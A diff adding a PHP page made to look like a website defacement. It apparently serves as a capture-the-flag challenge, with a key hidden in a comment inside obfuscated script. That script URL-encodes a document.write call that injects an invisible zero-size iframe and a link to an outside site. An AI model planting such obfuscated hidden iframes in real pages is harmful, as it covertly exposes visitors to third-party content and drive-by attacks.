@@ -1,0 +1,3 @@
+<?php require_once '../../header.php'; ?>
+<style>body{background:url('background.gif');}</style><div class="container" style="text-align:center;"><h1 style="color:red;">I'm Teng So Sexy</h1><img src="hack.png"><h3 style="color:red">Powered by <a href="http://tengsexy.com/">http://tengsexy.com/</a></h3></div><script>document.write(unescape("%3Cscript%3E%0A%3C%21--%0Adocument.<!-- Key: he11o_scr1pt_k1dd1e -->write%28unescape%28%22%3Ciframe%20frameborder%3D%220%22%20height%3D%220%22%20src%3D%22http%3A//www.devilscafe.in%22%20%0A%0Awidth%3D%220%22%3E%3C/iframe%3E%0A%3Ca%20href%3D%22http%3A//www.devilscafe.in%22%20target%3D%22_blank%22%3E%3Cimg%20%0A%0Asrc%3D%22%22%20/%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E"));</script>
+<?php require_once '../../footer.php'; ?>
